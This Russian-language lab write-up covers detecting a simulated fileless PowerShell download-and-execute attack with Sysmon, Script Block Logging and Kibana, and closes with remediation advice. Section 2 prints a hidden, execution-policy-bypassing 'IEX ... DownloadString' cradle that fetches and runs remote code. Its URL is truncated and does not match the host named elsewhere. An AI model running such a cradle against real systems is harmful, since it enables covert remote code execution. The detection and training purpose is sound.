# Кейс 02: Обнаружение скрытого выполнения PowerShell с загрузкой из сети (Fileless Execution)

## 1. Описание сценария и MITRE ATT&CK
* **Тактика:** Execution (TA0002), Command and Control (TA0011)
* **Техника:** Command and Scripting Interpreter: PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/)), Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))
* **Атакующий (C2 Server):** Kali Linux (`192.168.1.208`), HTTP-сервер на порту `8080`
* **Жертва (Endpoint):** Windows 10 Pro (`192.168.1.207`, хост `DESKTOP-6OV69S7`)

### Ценность телеметрии Sysmon и PowerShell в данном сценарии:
Стандартный журнал безопасности Windows (Security) не фиксирует аргументы командной строки при создании процессов (без дополнительных политик GPO) и не отображает содержимое выполняемых в памяти скриптов. Связка **Sysmon + PowerShell Script Block Logging** позволяет восстановить всю цепочку атаки: от флагов обхода политик выполнения до дочерних утилит разведки, запущенных из скачанного скрипта.

## 2. Симуляция атаки
1. На атакующем хосте **Kali Linux (`192.168.1.208`)** подготовлен тестовый скрипт разведки `payload.ps1` (`whoami`, `ipconfig`) и поднят HTTP-сервер на порту `8080`:
   ```bash
   python3 -m http.server 8080
   ```
2. На целевой машине **Windows 10 (`192.168.1.207`)** инициирована бесфайловая загрузка и выполнение скрипта в оперативной памяти (Download Cradle) с сокрытием окна консоли (`-W Hidden`) и обходом политики выполнения скриптов (`-Exec Bypass`):
   ```cmd
   powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1')"
   ```

### Доказательство со стороны C2 (Kali Linux):
<img width="665" height="206" alt="image" src="https://github.com/user-attachments/assets/24874d5b-107b-4316-8d5d-716b4ffb3652" />


## 3. Обнаружение и анализ в SIEM (Kibana)

### Поисковый запрос KQL:
```kql
(event.code: "1" and *powershell* and *192.168.1.208*) or (event.code: "3" and *powershell* and *192.168.1.208*) or (event.code: "4104" and message: *payload*)
```

### Ключевые артефакты расследования:
1. **Создание процесса с подозрительными флагами (`Sysmon Event ID 1`):**
   * **Процесс (`winlog.event_data.Image`):** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
   * **Командная строка (`winlog.event_data.CommandLine`):** содержит характерные индикаторы компрометации (IoC) — флаги `-NoP -NonI -W Hidden -Exec Bypass`, вызов `IEX` (`Invoke-Expression`) и загрузку по HTTP с узла `192.168.1.208:8080/payload.ps1`.
2. **Инспекция содержимого скрипта в памяти (`PowerShell Event ID 4104`):**
   * Механизм **Script Block Logging** перехватил и записал блок кода до его выполнения в оперативной памяти.
3. **Цепочка дочерних процессов разведки (`Sysmon Event ID 1`):**
   * Сразу после загрузки `payload.ps1` процесс `powershell.exe` породил дочерние системные утилиты сбора информации о хосте: **`whoami.exe`**, **`ipconfig.exe`** и **`findstr.exe`**.
4. **Наблюдение по тюнингу телеметрии (`Sysmon Event ID 3`):**
   * Событие сетевого подключения (`Event ID 3`) от `powershell.exe` к `192.168.1.208:8080` не было сгенерировано, так как базовая конфигурация **SwiftOnSecurity** исключает логирование сетевых соединений к локальным подсетям RFC 1918 (`192.168.0.0/16`) для снижения фонового шума. Для выявления внутренних атак (Lateral Movement / C2 в сегменте) рекомендуется добавить правило включения (`NetworkConnect onmatch="include"`) для `powershell.exe` в локальной подсети.

### Доказательства (Kibana Discover):
<img width="2266" height="676" alt="image" src="https://github.com/user-attachments/assets/9ce7444b-6644-4442-aa6f-81af2c640707" />


## 4. Рекомендации по реагированию и защите (Remediation)
1. **Сдерживание (Containment):** изолировать хост `DESKTOP-6OV69S7` от сети (или заблокировать трафик на `192.168.1.208:8080`), завершить дерево процессов `powershell.exe` и проверить систему на наличие механизмов закрепления (Persistence).
2. **Усиление защиты PowerShell:**
   * Включить режим **Constrained Language Mode** для непривилегированных пользователей, чтобы заблокировать вызов опасных .NET-классов (`System.Net.WebClient`).
   * Обеспечить обязательное логирование **Script Block Logging (Event ID 4104)** и работу **AMSI (Antimalware Scan Interface)** для инспекции обфусцированных команд в памяти.
3. **Тюнинг Sysmon и правил SIEM:**
   * Настроить правило корреляции в Elastic Security на наличие в `CommandLine` связки флагов скрытого запуска (`-W Hidden`, `-Exec Bypass`) и функций сетевой загрузки (`DownloadString`, `IEX`).
